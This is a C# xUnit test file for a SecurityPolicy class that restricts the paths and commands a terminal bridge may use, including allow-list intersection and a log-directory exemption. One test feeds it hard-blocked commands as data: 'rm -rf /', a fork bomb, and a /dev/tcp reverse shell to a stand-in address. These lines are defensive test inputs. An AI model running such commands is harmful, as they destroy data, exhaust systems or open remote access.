using Aria.Bridge;
using Xunit;

namespace Aria.Tests.Bridge;

public class SecurityPolicyTests
{
    [Fact]
    public void EnforcePath_AllowedPath_Passes()
    {
        var policy = new SecurityPolicy(["/home/user/projects"]);
        policy.EnforcePath("/home/user/projects/app");
    }

    [Fact]
    public void EnforcePath_BlockedPath_Throws()
    {
        var policy = new SecurityPolicy(["/home/user/projects"]);
        Assert.Throws<TerminalSecurityException>(() =>
            policy.EnforcePath("/etc/passwd"));
    }

    [Fact]
    public void EnforcePath_NoRestriction_PassesAnywhere()
    {
        var policy = new SecurityPolicy();
        policy.EnforcePath("/any/where");
    }

    [Theory]
    [InlineData("rm -rf /")]
    [InlineData(":(){ :|:& };:")]
    [InlineData("bash -i >& /dev/tcp/1.2.3.4/9999")]
    public void EnforceCommand_HardBlocked_Throws(string command)
    {
        var policy = new SecurityPolicy();
        Assert.Throws<TerminalSecurityException>(() =>
            policy.EnforceCommand(command));
    }

    [Fact]
    public void EnforceCommand_NodeAndRequestBlocked_UnionBlocks()
    {
        var policy = new SecurityPolicy(BlockedCommands: ["node-request-block"]);
        Assert.Throws<TerminalSecurityException>(() =>
            policy.EnforceCommand("npm node-request-block"));
    }

    [Fact]
    public void FromNodeAndRequest_NodeAllowedEmpty_BlocksAllPaths()
    {
        // An empty node-side allowed list is not "no restriction"; it blocks everything,
        // preventing a compromised server from widening the scope by sending its own paths.
        var policy = SecurityPolicy.FromNodeAndRequest(
            nodeAllowedPaths: null,
            requestAllowedPaths: ["/home/user/project"]);

        Assert.Throws<TerminalSecurityException>(() =>
            policy.EnforcePath("/home/user/project/src"));
        Assert.Throws<TerminalSecurityException>(() =>
            policy.EnforcePath("/etc"));
    }

    [Fact]
    public void FromNodeAndRequest_NodeAllowedExists_RequestNarrows()
    {
        var policy = SecurityPolicy.FromNodeAndRequest(
            nodeAllowedPaths: ["/home/user"],
            requestAllowedPaths: ["/home/user/project-a"]);

        policy.EnforcePath("/home/user/project-a/src");
        Assert.Throws<TerminalSecurityException>(() =>
            policy.EnforcePath("/home/user/project-b"));
        Assert.Throws<TerminalSecurityException>(() =>
            policy.EnforcePath("/etc"));
    }

    [Fact]
    public void FromNodeAndRequest_RequestTriesToWiden_EffectiveIsIntersection()
    {
        var policy = SecurityPolicy.FromNodeAndRequest(
            nodeAllowedPaths: ["/home/user/project-a"],
            requestAllowedPaths: ["/home/user/project-a/src", "/opt/other"]);

        policy.EnforcePath("/home/user/project-a/src");
        // /opt/other is not under the node allowed path, so it is dropped.
        Assert.Throws<TerminalSecurityException>(() =>
            policy.EnforcePath("/opt/other"));
    }

    [Fact]
    public void FromNodeAndRequest_NodeBlockedAlwaysApplies()
    {
        var policy = SecurityPolicy.FromNodeAndRequest(
            nodeAllowedPaths: null,
            requestAllowedPaths: null,
            nodeBlockedCommands: ["node-block"],
            requestBlockedCommands: ["request-block"]);

        Assert.Throws<TerminalSecurityException>(() =>
            policy.EnforceCommand("node-block"));
        Assert.Throws<TerminalSecurityException>(() =>
            policy.EnforceCommand("request-block"));
    }

    [Fact]
    public void FromNodeAndRequest_NodeAllowedExists_RequestEmpty_UsesNode()
    {
        var policy = SecurityPolicy.FromNodeAndRequest(
            nodeAllowedPaths: ["/home/user"],
            requestAllowedPaths: null);

        policy.EnforcePath("/home/user/anything");
        Assert.Throws<TerminalSecurityException>(() =>
            policy.EnforcePath("/etc"));
    }

    [Fact]
    public void EnforcePath_BackgroundLogDir_ExemptFromAllowedPaths()
    {
        // Background-job logs live in the system temp dir, outside any project scope; reading
        // them back (follow-up read_file on a log_file path) must not trip the gate.
        var policy = SecurityPolicy.FromNodeAndRequest(
            nodeAllowedPaths: ["/home/user/project"],
            requestAllowedPaths: null);

        policy.EnforcePath(Path.Combine(BridgePaths.BackgroundLogDir, "bg-20260726-120000-abc123.log"));
        policy.EnforcePath(Path.Combine(BridgePaths.BackgroundLogDir, "bg-20260726-120000-abc123.log.exit"));
    }

    [Fact]
    public void EnforcePath_BackgroundLogDirSibling_NotExempt()
    {
        var policy = SecurityPolicy.FromNodeAndRequest(
            nodeAllowedPaths: ["/home/user/project"],
            requestAllowedPaths: null);

        // Only the exact log dir is exempt — a lookalike sibling is not.
        Assert.Throws<TerminalSecurityException>(() =>
            policy.EnforcePath(Path.Combine(Path.GetTempPath(), "aria-bg-evil", "x.log")));
    }
}
